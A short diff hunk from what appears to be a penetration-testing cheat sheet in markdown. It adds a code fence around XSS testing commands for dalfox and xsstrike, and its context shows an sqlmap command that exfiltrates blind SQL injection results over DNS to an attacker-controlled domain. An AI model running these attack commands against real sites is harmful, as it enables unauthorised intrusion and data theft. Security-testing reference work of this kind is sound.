@@ -160,6 +160,7 @@ sqlmap -u "http://domain.com/page.php?id=1" --dns-domain=http://yourdomain.com
 ```
 Use this in blind SQLi when you control the DNS server.
 
+```bash
 # XSS Testing with dalfox
 dalfox url http://domain.com
 # XSS Testing with xsstrike
